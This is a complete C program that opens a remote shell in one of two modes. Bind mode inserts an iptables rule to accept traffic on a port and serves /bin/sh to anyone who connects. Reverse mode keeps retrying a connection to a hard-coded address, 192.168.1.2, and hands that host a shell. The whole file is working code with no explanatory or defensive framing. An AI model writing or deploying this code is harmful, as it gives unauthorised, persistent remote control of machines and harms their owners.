#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define DEFAULT_BIND_PORT 7878
#define DEFAULT_REVERSE_PORT 7878
#define DEFAULT_REVERSE_HOST "192.168.1.2"

void open_port(unsigned int port) {
	char buf[0x200] = {0};
	snprintf(buf, sizeof buf, "iptables -I INPUT -p tcp -m tcp --dport %d -j ACCEPT", port);
	system(buf);
}

void serve_shell(int conn_fd) {
	const char msg []= "Connected!\n";
	write(conn_fd, msg, sizeof msg - 1);

	dup2(conn_fd, 2);
	dup2(conn_fd, 1);
	dup2(conn_fd, 0);
	char * const argv[] = {"sh", NULL};
	execve("/bin/sh", argv, NULL);
	// no return
	close(conn_fd);
}

int bind_shell(char** args) {
	unsigned int port = DEFAULT_BIND_PORT;
	if (args[0]) {
		port = atoi(args[0]);
		if (port == 0) {
			printf("[!] Invalid port \"%s\". Exiting...\n", args[0]);
			return EXIT_FAILURE;
		}
	}

	open_port(port);
	printf("[i] Starting bind shell on 0.0.0.0:%d\n", port);

	struct sockaddr_in sockaddr;
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	int one = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	bind(sockfd, (struct sockaddr *) &sockaddr, sizeof(sockaddr));
	listen(sockfd, 2);

	while (1) {
		int conn_fd = accept(sockfd, NULL, NULL);
		if (conn_fd == -1) {
			perror("Failed to accept");
			return EXIT_FAILURE;
		}
		int pid = fork();
		if (pid == -1) {
			perror("Failed to fork on accept");
			return EXIT_FAILURE;
		}
		if (pid == 0) {
			// We're the child! Open ze shell!
			close(sockfd);
			serve_shell(conn_fd);
			break;
		} else {
			// Close the connection in the parent
			close(conn_fd);
		}
	}
    return EXIT_SUCCESS;
}

int reverse_shell(char** args) {
	unsigned int port = DEFAULT_REVERSE_PORT;
	char * host = DEFAULT_REVERSE_HOST;
	if (args[0])
		host = args[0];
	if (args[1]) {
		port = atoi(args[1]);
		if (port == 0) {
			printf("[!] Invalid port \"%s\". Exiting...\n", args[1]);
			return EXIT_FAILURE;
		}
	}

	printf("[i] Starting reverse shell for %s:%d\n", host, port);

	while (1) {
		struct sockaddr_in revsockaddr;
		int sockt = socket(AF_INET, SOCK_STREAM, 0);
		revsockaddr.sin_family = AF_INET;       
		revsockaddr.sin_port = htons(port);
		revsockaddr.sin_addr.s_addr = inet_addr(host);
		int err = connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
		if (err == -1) {
			perror("Failed to accept, sleeping for 10 seconds");
			sleep(10);
			continue;
		}
		int pid = fork();
		if (pid  == -1) {
			perror("Failed to fork on accept");
			return EXIT_FAILURE;
		} else if (pid == 0) {
			serve_shell(sockt);
		} else {
			close(sockt);
		}
	}
	return EXIT_SUCCESS;
}

int main(int argc, char** argv) {
	char * args[3] = {0};
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	for (int i = 1; i < argc && i < 4; i++)
		args[i-1] = argv[i];

	if (args[0]) {
		if (strcmp("bind", args[0]) == 0) {
			return bind_shell(&args[1]);
		} else if (strcmp("reverse", argv[1]) == 0) {
			return reverse_shell(&args[1]);
		} else {
			printf("[!] Invalid mode \"%s\". Exiting...\n", args[0]);
			return EXIT_FAILURE;
		}
	}

	puts("[i] No mode specified, assuming bind shell");
	return bind_shell(&args[1]);
}
